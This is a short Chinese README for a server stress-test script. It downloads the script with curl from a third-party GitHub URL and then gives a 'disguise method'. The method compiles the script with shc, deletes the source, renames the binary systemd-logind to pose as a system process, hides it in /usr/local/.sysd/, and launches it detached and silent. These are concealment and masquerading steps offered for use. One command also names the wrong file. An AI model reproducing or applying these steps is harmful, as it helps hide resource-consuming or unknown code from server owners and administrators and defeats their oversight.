服务器压力测试脚本

依赖：```stress-ng```

安装命令：```apt install stress-ng -y```

下载脚本：```curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/yali.sh```

下载后使用编辑器编辑配置

伪装方法：

# 编译脚本
```shc -f yali.sh```
# 得到 yali.sh.x 二进制程序
```rm -f yali.sh.x.c```   # 删除无用C源码

# 伪装成系统常用进程
```mv test.sh.x systemd-logind```

```chmod 700 systemd-logind```

# 建隐藏目录
```mkdir -p /usr/local/.sysd/```
# 把伪装二进制移进去
```mv systemd-logind /usr/local/.sysd/```
# 隐身启动
```setsid /usr/local/.sysd/systemd-logind >/dev/null 2>&1```
